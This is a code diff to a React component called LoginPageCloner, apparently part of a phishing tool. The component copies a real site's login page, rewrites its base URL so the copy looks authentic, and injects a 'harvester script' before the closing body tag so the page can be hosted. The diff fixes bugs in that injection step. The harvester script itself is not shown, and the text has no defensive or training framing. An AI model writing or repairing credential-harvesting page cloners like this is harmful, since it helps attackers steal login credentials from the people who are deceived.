@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState } from 'react';
@@ -142,13 +143,13 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
              if (html.includes('<head>')) {
                 html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
             } else {
-                html = `<head><base href="${baseHrefUrl}"></head>`+html;
+                html = `<head><base href="${baseHrefUrl}"></head>${html}`;
             }
         }
 
         // Inject the harvester script just before the closing body tag.
         if (html.includes('</body>')) {
-            html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
+            html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
         } else {
             // If no body tag, just append it.
             html += harvesterScript;
